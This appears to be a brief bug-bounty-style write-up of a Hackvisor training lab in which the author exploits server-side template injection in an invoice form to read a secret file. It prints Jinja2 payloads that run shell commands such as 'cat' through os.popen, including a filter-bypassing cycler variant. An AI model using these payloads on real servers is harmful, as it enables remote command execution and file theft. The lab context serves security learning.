# Server-Side Template Injection (SSTI) Hackvisor Lab

- **Source URL:** https://medium.com/@yossefmohamedsalah2001/server-side-template-injection-ssti-hackvisor-lab-50d42ec27639?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251009201150/https://medium.com/@yossefmohamedsalah2001/server-side-template-injection-ssti-hackvisor-lab-50d42ec27639
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/11221 (id 11221)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Server-Side Template Injection (SSTI) Hackvisor Lab

Hello And Welcome again my friends this dialogue is about how I accessed the flag on */home/secret.txt* By injectec SSTI Full Senario


i used my machine to target the file secret is found on /home

First I created my invoice to get receipt or information about system I named it time hammer “You can called with item you want it” and confirmed the request in Burb to see the content of I send to server

and the request content of locally burp

You see that confirmed successfully, and the reply status of 200

What is Next Step you can think it ???

ok lets try SSTI {{7\*7}} and see the results

ooh that's awesome I see I want to see then already, that can me thinking about critical Files access passed, shadow, config.log, …. etc

ok try to test payloads in name param

`name={{request.__class__.__mro__[1].__subclasses__()[40]('/tagetfile.txt').read()}}`
or

`name={{%20__import__('os').popen('cat {targetfile.txt}').read()%20}}&address=test&items=test&total=1`
its make blocked from server

ok lets do the magic payload that passed from server

`{{cycler.__init__.__globals__.os.popen('cat targetfile.txt').read()}}`
ok I get secret file

Riddikulus 🌺🌺

That’s it thanks man 🥷 don't forget to follow me to see other payloads and solve expert / Associate Labs or Bugs 🥰
